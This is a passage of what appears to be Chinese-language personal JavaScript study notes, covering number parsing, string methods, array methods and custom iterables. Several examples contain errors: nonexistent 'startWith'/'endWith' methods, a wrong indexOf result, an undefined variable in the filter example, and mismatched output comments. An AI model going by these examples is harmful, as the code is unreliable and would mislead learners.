</ul>
<p><strong>isNaN判断一个参数是否为Number</strong>（判断之前先将它们专为数字然后再判断）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">isNaN</span>(<span class="string">&quot;str&quot;</span>); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">isNaN</span>(<span class="string">&quot;12&quot;</span>); <span class="comment">// false</span></span><br><span class="line"><span class="built_in">isNaN</span>(<span class="number">12</span>); <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<h3 id="parseInt-amp-parseFloat"><a href="#parseInt-amp-parseFloat" class="headerlink" title="parseInt &amp; parseFloat"></a>parseInt &amp; parseFloat</h3><p><em><strong><code>+</code>和<code>Number()</code>可以进行数字转换，但如果其不是数字字符串则会转换失败并返回<code>NaN</code></strong></em></p>
<p>使用parseInt和parseFloat可以解决这个问题</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;100px&#x27;</span>); <span class="comment">// 100</span></span><br><span class="line"><span class="built_in">parseFloat</span>(<span class="string">&#x27;12.555px&#x27;</span>); <span class="comment">// 12.555</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;px1000&#x27;</span>); <span class="comment">//NaN</span></span><br><span class="line"><span class="built_in">parseFloat</span>(<span class="string">&#x27;px12.555&#x27;</span>); <span class="comment">//NaN</span></span><br></pre></td></tr></table></figure>
<p><code>parseInt(str, base)</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;0xff&#x27;</span>, <span class="number">16</span>); <span class="comment">// 255</span></span><br></pre></td></tr></table></figure>
<h3 id="内建Math其他函数"><a href="#内建Math其他函数" class="headerlink" title="内建Math其他函数"></a>内建Math其他函数</h3><ul>
<li>Math.random() — 返回一个0-1的随机数（不包括1）</li>
<li>Math.max(a, b, c, …) —- 返回一个最大数</li>
<li>Math.min(a, b, c, …) —- 返回一个最小数</li>
<li>Math.pow(n, power) — 返回n<sup>power</sup></li>
</ul>
<h3 id="e"><a href="#e" class="headerlink" title="e"></a>e</h3><p>en(n为数字)表示 $*10^{n}$</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> Twothousand = <span class="number">2e3</span>; <span class="comment">// 2000</span></span><br></pre></td></tr></table></figure>
<h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><h2 id="引号"><a href="#引号" class="headerlink" title="引号"></a>引号</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> s1 = <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line"><span class="keyword">let</span> s2 = <span class="string">&quot;s&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> s3 = <span class="string">`s`</span>;</span><br></pre></td></tr></table></figure>
<p>反引号允许</p>
<ol>
<li>使用<code>$&#123;...&#125;</code>将任何表达式嵌入</li>
<li>换行</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> s4 = <span class="string">`s2是<span class="subst">$&#123;s3&#125;</span>。1+2=<span class="subst">$&#123;sum(<span class="number">1</span>,<span class="number">2</span>)&#125;</span>`</span>;</span><br></pre></td></tr></table></figure>
<h2 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h2><h3 id="length属性"><a href="#length属性" class="headerlink" title="length属性"></a>length属性</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> word = <span class="string">&quot;William&quot;</span>;</span><br><span class="line">word.length; <span class="comment">// 7</span></span><br></pre></td></tr></table></figure>
<h3 id="获取某一位置的字符"><a href="#获取某一位置的字符" class="headerlink" title="获取某一位置的字符"></a>获取某一位置的字符</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> word1 = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">word[<span class="number">0</span>]; <span class="comment">// H</span></span><br><span class="line">word.charAt(<span class="number">0</span>); <span class="comment">// H</span></span><br></pre></td></tr></table></figure>
<p><strong>可以使用<code>for ... of</code>遍历字符串</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> alphabet <span class="keyword">of</span> <span class="string">&#x27;Hello&#x27;</span>) &#123;</span><br><span class="line">  alert(alphabet); <span class="comment">// H e l l o</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="字符串unmutable"><a href="#字符串unmutable" class="headerlink" title="字符串unmutable"></a>字符串unmutable</h3><h3 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h3><p>$\textcolor{blue}{toUpperCase(), toLowerCase()}$</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;hello world&#x27;</span>.toUpperCase(); <span class="comment">// HELLO WORLD</span></span><br><span class="line"><span class="string">&#x27;Hello World&#x27;</span>.toLowerCase(); <span class="comment">// hello world</span></span><br></pre></td></tr></table></figure>
<h3 id="查询子字符串"><a href="#查询子字符串" class="headerlink" title="查询子字符串"></a>查询子字符串</h3><p><code>string.indexOf(substr, pos)</code>，substr为要查询的子字符串，pos为从指定位置开始查询</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> word = <span class="string">&#x27;Hello Word!&#x27;</span>;</span><br><span class="line">word.indexOf(<span class="string">&#x27;World&#x27;</span>); <span class="comment">// 6</span></span><br></pre></td></tr></table></figure>
<p><strong>Others:</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;Hello&quot;</span>.includes(<span class="string">&quot;el&quot;</span>); <span class="comment">// true</span></span><br><span class="line"><span class="string">&quot;Hello&quot;</span>.startWith(<span class="string">&#x27;He&#x27;</span>); <span class="comment">// true</span></span><br><span class="line"><span class="string">&quot;Hello&quot;</span>.endWith(<span class="string">&#x27;lo&#x27;</span>); <span class="comment">//true</span></span><br></pre></td></tr></table></figure>
<h3 id="获取子字符串☑️"><a href="#获取子字符串☑️" class="headerlink" title="获取子字符串☑️"></a>获取子字符串☑️</h3><h4 id="slice-start-end"><a href="#slice-start-end" class="headerlink" title="slice( start[, end) )"></a>slice( start[, end) )</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> word = <span class="string">&quot;HelloWorld&quot;</span>;</span><br><span class="line">word.slice(<span class="number">0</span>,<span class="number">3</span>); <span class="comment">// Hel</span></span><br></pre></td></tr></table></figure>
<h4 id="substr-start-length"><a href="#substr-start-length" class="headerlink" title="substr( start[, length )"></a>substr( start[, length )</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> word = <span class="string">&quot;HelloWorld&quot;</span>;</span><br><span class="line">word.substr(<span class="number">1</span>,<span class="number">3</span>); <span class="comment">// ell</span></span><br></pre></td></tr></table></figure>
<h3 id="比较字符串"><a href="#比较字符串" class="headerlink" title="比较字符串"></a>比较字符串</h3><h4 id="小写字母总是大于大写字母"><a href="#小写字母总是大于大写字母" class="headerlink" title="小写字母总是大于大写字母"></a>小写字母总是大于大写字母</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;a&#x27;</span> &gt; <span class="string">&#x27;Z&#x27;</span>; <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>在JS内部，所有字符串都使用UTF-16编码（即：每个字符都有相应的数字代码）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;zealand&quot;</span>.codePointAt(<span class="number">0</span>); <span class="comment">// 122</span></span><br><span class="line"><span class="string">&quot;Zealand&quot;</span>.codePointAt(<span class="number">0</span>); <span class="comment">// 90</span></span><br><span class="line"><span class="built_in">String</span>.fromCodePoint(<span class="number">90</span>); <span class="comment">// Z</span></span><br></pre></td></tr></table></figure>
<h1 id="数组Array"><a href="#数组Array" class="headerlink" title="数组Array"></a>数组Array</h1><h2 id="1-声明"><a href="#1-声明" class="headerlink" title="1. 声明"></a>1. 声明</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="keyword">let</span> arr2 = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> fruits = [<span class="string">&quot;Apple&quot;</span>, <span class="string">&quot;Orange&quot;</span>, <span class="string">&quot;Plum&quot;</span>];</span><br><span class="line"></span><br><span class="line">fruits[<span class="number">0</span>]; <span class="comment">// &quot;Apple&quot;</span></span><br><span class="line"></span><br><span class="line">fruits[<span class="number">1</span>] = <span class="string">&quot;Pear&quot;</span>;</span><br><span class="line"></span><br><span class="line">fruits.length; <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr3 = [<span class="string">&#x27;Apple&#x27;</span>, &#123;<span class="attr">name</span>:<span class="string">&#x27;Will&#x27;</span>&#125;, <span class="literal">true</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;alert(<span class="string">&#x27;Hello&#x27;</span>);&#125;]; <span class="comment">// 任意类型数据</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="2-队列Queue和栈Stack"><a href="#2-队列Queue和栈Stack" class="headerlink" title="2. 队列Queue和栈Stack"></a>2. 队列Queue和栈Stack</h2><ol>
<li><h3 id="队列Queue-—-First-In-First-Out"><a href="#队列Queue-—-First-In-First-Out" class="headerlink" title="队列Queue — First In First Out"></a>队列Queue — First In First Out</h3><blockquote>
<p>push —— 在末端加一个元素</p>
<p>shift —— 取出队首一个元素，并返回该值</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> fruits = [<span class="string">&quot;Apple&quot;</span>, <span class="string">&quot;Orange&quot;</span>, <span class="string">&quot;Pear&quot;</span>];</span><br><span class="line"></span><br><span class="line">fruits.push(<span class="string">&quot;Banana&quot;</span>); <span class="comment">// </span></span><br><span class="line">fruits; <span class="comment">// &quot;Apple&quot;, &quot;Orange&quot;, &quot;Banana&quot;</span></span><br><span class="line"></span><br><span class="line">fruits.shift(); <span class="comment">// &quot;Apple&quot;</span></span><br><span class="line">fruits; <span class="comment">// &quot;Orange&quot;, &quot;Banana&quot;</span></span><br></pre></td></tr></table></figure></li>
<li><h3 id="栈Stack-—-Last-In-First-Out"><a href="#栈Stack-—-Last-In-First-Out" class="headerlink" title="栈Stack — Last In First Out"></a>栈Stack — Last In First Out</h3><blockquote>
<p>push</p>
<p>pop —— 从末端取出一个元素，并返回该值</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">fruits.pop(); <span class="comment">// &quot;Pear&quot;</span></span><br><span class="line">fruits; <span class="comment">// &quot;Apple&quot;, &quot;Orange&quot;</span></span><br></pre></td></tr></table></figure></li>
<li><h3 id="unshift"><a href="#unshift" class="headerlink" title="unshift()"></a>unshift()</h3><p>在数组首端添加元素</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">fruits.unshift(<span class="string">&quot;Banana&quot;</span>);</span><br><span class="line">fruits; <span class="comment">// &quot;Banana&quot;, &quot;Apple&quot;, &quot;Orange&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="3-内部"><a href="#3-内部" class="headerlink" title="3.内部"></a>3.内部</h2></li>
</ol>
<p>数组本质上也是一个对象，<code>arr[0]</code>本质上类似<code>obj[key]</code>，arr是对象，数字是键</p>
<h2 id="4-性能"><a href="#4-性能" class="headerlink" title="4.性能"></a>4.性能</h2><p><code>push/pop</code>运行较快，而<code>shift/unshift</code>运行较慢</p>
<h2 id="5-循环"><a href="#5-循环" class="headerlink" title="5.循环"></a>5.循环</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">&quot;Apple&quot;</span>, <span class="string">&quot;orange&quot;</span>, <span class="string">&quot;Mango&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// for loop</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i&lt;arr.length; i++) &#123;</span><br><span class="line">  alert(arr[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// for...of loop</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> element <span class="keyword">of</span> arr) &#123;</span><br><span class="line">  alert(element);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="6-length-可修改"><a href="#6-length-可修改" class="headerlink" title="6. length 可修改"></a>6. length 可修改</h2><h2 id="7-toString"><a href="#7-toString" class="headerlink" title="7. toString()"></a>7. toString()</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">&quot;Apple&quot;</span>, <span class="string">&quot;orange&quot;</span>, <span class="string">&quot;Mango&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">String</span>(arr); <span class="comment">// &#x27;Apple,orange,Mango&#x27;</span></span><br><span class="line">arr.toString(); <span class="comment">// &#x27;Apple,orange,Mango&#x27;</span></span><br></pre></td></tr></table></figure>
<h1 id="数组的方法‼️"><a href="#数组的方法‼️" class="headerlink" title="数组的方法‼️"></a>数组的方法‼️</h1><h2 id="splice-start-deleteCount-element1-element2-…-—-in-place"><a href="#splice-start-deleteCount-element1-element2-…-—-in-place" class="headerlink" title="splice( start[, deleteCount, element1, element2, … ) — in-place"></a>splice( start[, deleteCount, element1, element2, … ) — in-place</h2><p><strong>可以实现插入、删除</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">&quot;I&quot;</span>, <span class="string">&quot;study&quot;</span>, <span class="string">&quot;JavaScript&quot;</span>, <span class="string">&quot;right&quot;</span>, <span class="string">&quot;now&quot;</span>];</span><br><span class="line">arr.splice(<span class="number">0</span>, <span class="number">3</span>, <span class="string">&quot;Let&#x27;s&quot;</span>, <span class="string">&quot;dance&quot;</span>); <span class="comment">// [&quot;I&quot;, &quot;study&quot;, &quot;JavaScript&quot;];</span></span><br><span class="line">arr; <span class="comment">// [&quot;Let&#x27;s&quot;, &quot;dance&quot;, &quot;right&quot;, &quot;now&quot;]</span></span><br></pre></td></tr></table></figure>
<h2 id="slice-start-end-1"><a href="#slice-start-end-1" class="headerlink" title="slice( start[, end) )"></a>slice( start[, end) )</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;o&#x27;</span>];</span><br><span class="line"><span class="keyword">let</span> newArr = arr.slice(<span class="number">1</span>,<span class="number">3</span>) <span class="comment">// newArr = [&#x27;e&#x27;, &#x27;l&#x27;]</span></span><br></pre></td></tr></table></figure>
<h2 id="concat-arg1-arg2-…"><a href="#concat-arg1-arg2-…" class="headerlink" title="concat(arg1, arg2, …)"></a>concat(arg1, arg2, …)</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">arr.concat(<span class="number">5</span>, [<span class="number">7</span>,<span class="number">9</span>]); <span class="comment">// [1,2,3,5,7,9]</span></span><br><span class="line"><span class="keyword">let</span> obj1 = &#123;<span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&quot;Will&quot;</span>&#125;;</span><br><span class="line">arr.concat(obj1); <span class="comment">// [1,2,3,&#123;id: 1, name: &quot;Will&quot;&#125;]</span></span><br></pre></td></tr></table></figure>
<h2 id="遍历：forEach"><a href="#遍历：forEach" class="headerlink" title="遍历：forEach"></a>遍历：forEach</h2><p>array.forEach可以实现为数组中的每个元素都运行一个函数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [...];</span><br><span class="line">arr.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">item, index, array</span>) </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>用例如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">&quot;Nottingham&quot;</span>, <span class="string">&quot;London&quot;</span>, <span class="string">&quot;Manchestor&quot;</span>];</span><br><span class="line">arr.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">item, index, array</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;item&#125;</span> is at index <span class="subst">$&#123;index&#125;</span> in <span class="subst">$&#123;array&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h2 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h2><h3 id="indexOf-lastIndexOf-includes"><a href="#indexOf-lastIndexOf-includes" class="headerlink" title="indexOf, lastIndexOf, includes"></a>indexOf, lastIndexOf, includes</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// arr.indexOf(item, from); 从索引from开始找item，找到返回index，否则返回-1</span></span><br><span class="line"><span class="comment">// arr.lastindexOf(item, from); 同上，但从右向左</span></span><br><span class="line"><span class="comment">// arr.includes(item, from); 从索引from开始搜索item，找到返回true，否则返回false</span></span><br><span class="line"></span><br><span class="line">arr.indexOf(<span class="number">2</span>, <span class="number">1</span>); <span class="comment">// 1</span></span><br><span class="line">arr.includes(<span class="number">3</span>); <span class="comment">// true </span></span><br></pre></td></tr></table></figure>
<h3 id="find-findindex"><a href="#find-findindex" class="headerlink" title="find, findindex"></a>find, findindex</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">let</span> result = arr.find(<span class="function"><span class="keyword">function</span>(<span class="params">item, index, array</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 返回true，则搜索停止并返回item</span></span><br><span class="line">  <span class="comment">// 返回false则返回undefined</span></span><br><span class="line">&#125;)；</span><br></pre></td></tr></table></figure>
<p><strong>用例</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> users = [</span><br><span class="line">  &#123;<span class="attr">id</span>:<span class="number">1</span>,<span class="attr">name</span>:<span class="string">&quot;Will&quot;</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">id</span>:<span class="number">2</span>,<span class="attr">name</span>:<span class="string">&quot;Dion&quot;</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">id</span>:<span class="number">3</span>,<span class="attr">name</span>:<span class="string">&quot;Akshay&quot;</span>&#125;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> user = users.find(<span class="function">(<span class="params">user</span>)=&gt;</span>&#123;<span class="keyword">return</span> user.id==<span class="number">1</span>&#125;);</span><br><span class="line">user.name; <span class="comment">// &quot;Will&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="filter⭐️"><a href="#filter⭐️" class="headerlink" title="filter⭐️"></a>filter⭐️</h3><p>与find的类似，不过区别在于如果其返回true，搜索会继续直到遍历完整个数组，并返回所有匹配元素组成的数组。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> user = users.filter(<span class="function"><span class="params">user</span> =&gt;</span> item.id &lt;= <span class="number">2</span>);</span><br><span class="line">user.length; <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<h2 id="转换数组"><a href="#转换数组" class="headerlink" title="转换数组"></a>转换数组</h2><h3 id="map"><a href="#map" class="headerlink" title="map"></a>map</h3><p>对数组中的每个元素调用map参数中的该函数，并返回结果数组</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> res = arr.map(<span class="function"><span class="keyword">function</span>(<span class="params">item, index, array</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 返回新值而不是当前元素</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p><strong>用例</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> names = [<span class="string">&quot;Will&quot;</span>, <span class="string">&quot;Dions&quot;</span>, <span class="string">&quot;Akshay&quot;</span>];</span><br><span class="line"><span class="keyword">let</span> lengths = names.map(<span class="function"><span class="params">name</span> =&gt;</span> name.length);</span><br><span class="line">lengths; <span class="comment">// [4,5,6]</span></span><br></pre></td></tr></table></figure>
<h3 id="sort-—-in-place"><a href="#sort-—-in-place" class="headerlink" title="sort — in-place"></a>sort — in-place</h3><p>对数组进行原位（in-place）排序，更改数组中元素的顺序，其语法为<code>数组.sort(排序函数)</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">compare</span>(<span class="params">a,b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (a&gt;b) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (a==b) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (a&lt;b) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">arr.sort(compare); <span class="comment">// [1,2,4,9]</span></span><br><span class="line">arr; <span class="comment">// [1,2,4,9]</span></span><br></pre></td></tr></table></figure>
<p><strong>实际上，排序函数可以返回任意数字（正数代表”大于”，负数代表”小于”）；同时使用箭头函数会更简洁</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">2</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">1</span>];</span><br><span class="line">arr.sort( <span class="function">(<span class="params">a,b</span>) =&gt;</span> a-b ); <span class="comment">//[1,2,8,9]</span></span><br><span class="line">arr; <span class="comment">// [1,2,8,9]</span></span><br></pre></td></tr></table></figure>
<p><strong>localeCompare</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> countries = [<span class="string">&#x27;Österreich&#x27;</span>, <span class="string">&#x27;Andorra&#x27;</span>, <span class="string">&#x27;Vietnam&#x27;</span>];</span><br><span class="line"></span><br><span class="line">countries.sort( <span class="function">(<span class="params">a,b</span>) =&gt;</span> a.localeCompare(b) ); <span class="comment">// [Andorra,Österreich,Vietnam]</span></span><br></pre></td></tr></table></figure>
<h3 id="reverse-—-in-place"><a href="#reverse-—-in-place" class="headerlink" title="reverse — in-place"></a>reverse — in-place</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">arr.reverse();</span><br><span class="line"></span><br><span class="line">arr; <span class="comment">// [3,2,1]</span></span><br></pre></td></tr></table></figure>
<h3 id="split-join"><a href="#split-join" class="headerlink" title="split, join"></a>split, join</h3><ol>
<li><p><strong>分割字符串为数组</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> names = <span class="string">&quot;Will, Dion, Akshay&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> arr = names.split(<span class="string">&#x27;, &#x27;</span>);</span><br><span class="line">arr; <span class="comment">// [&quot;Will&quot;, &quot;Dion&quot;, &quot;Akshay&quot;]</span></span><br></pre></td></tr></table></figure></li>
<li><p><strong>合并数组元素为字符串</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> strName = arr.join(<span class="string">&quot; &quot;</span>);</span><br><span class="line">strName; <span class="comment">// &quot;Will Dion Akshay&quot;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="reduce-reduceRight"><a href="#reduce-reduceRight" class="headerlink" title="reduce, reduceRight"></a>reduce, reduceRight</h3><p>用于根据数组计算单个值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> value = arr.reduce(<span class="function"><span class="keyword">function</span>(<span class="params">accumulator, item, index, array</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;, [initial]);</span><br></pre></td></tr></table></figure>
<ul>
<li><p>accumulator本质上是个累加器。</p>
</li>
<li><p>应用reduce函数时，它会将上一个参数函数调用的结果作为第一个参数传递给下一个函数</p>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line"><span class="keyword">let</span> res = arr.reduce( <span class="function">(<span class="params">sum, current</span>) =&gt;</span> sum+current, <span class="number">0</span> );</span><br><span class="line">res; <span class="comment">// 15</span></span><br></pre></td></tr></table></figure>
<h3 id="Array-isArray"><a href="#Array-isArray" class="headerlink" title="Array.isArray"></a>Array.isArray</h3><p>数组是基于对象的，因此无法使用<code>typeof</code>进行判断</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typeof</span> []; <span class="comment">// object</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.isArray( [] ); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Array</span>.isArray( &#123;&#125; ); <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<h1 id="可迭代对象（Iterable-Object）"><a href="#可迭代对象（Iterable-Object）" class="headerlink" title="可迭代对象（Iterable Object）"></a>可迭代对象（Iterable Object）</h1><p>可迭代对象是数组的泛化，任何对象都可以被定制为可在<code>for...of</code>循环中使用的对象。</p>
<h2 id="Symbol-iterator"><a href="#Symbol-iterator" class="headerlink" title="Symbol.iterator"></a>Symbol.iterator</h2><p><strong>为对象添加一个名为<code>Symbol.iterator</code>方法，便可使其可迭代</strong></p>
<ol>
<li>当<code>for...of</code>循环时，会调用该方法，同时该方法须返回一个<strong>迭代器</strong>（即有next()方法的对象）</li>
<li>此后，<code>for...of</code>仅作用于这个被返回的迭代器</li>
<li><code>for...of</code>会调用<code>next()</code>方法来取得下一个数值</li>
<li>next()返回的结果对象格式必须为：<code>&#123;done: Boolean, value: any&#125;</code>。其中当<code>done=true</code>时，迭代结束，否则<code>value</code>为下一个值</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> range = &#123;</span><br><span class="line">  <span class="keyword">from</span>: <span class="number">1</span>,</span><br><span class="line">  to: <span class="number">5</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加一个名为Symbol.iterator方法</span></span><br><span class="line">range[<span class="built_in">Symbol</span>.iterator] = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 返回一个迭代器</span></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    current: <span class="built_in">this</span>.from,</span><br><span class="line">    last: <span class="built_in">this</span>.to,</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 加入next()方法</span></span><br><span class="line">    <span class="function"><span class="title">next</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">      <span class="comment">// 返回要求格式的对象</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">this</span>.current &lt;= <span class="built_in">this</span>.last) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123; <span class="attr">done</span>: <span class="literal">false</span>, <span class="attr">value</span>: <span class="built_in">this</span>.current++ &#125;;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123; <span class="attr">done</span>:<span class="literal">true</span> &#125;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> num <span class="keyword">of</span> range) &#123;</span><br><span class="line">  num; <span class="comment">// 1,2,3,4,5</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="字符串是可迭代的"><a href="#字符串是可迭代的" class="headerlink" title="字符串是可迭代的"></a>字符串是可迭代的</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> char <span class="keyword">of</span> <span class="string">&#x27;test&#x27;</span>) &#123;</span><br><span class="line">  char; <span class="comment">// &#x27;t&#x27;, &#x27;e&#x27;, &#x27;s&#x27;, &#x27;t&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>显示调用迭代器</strong></p>
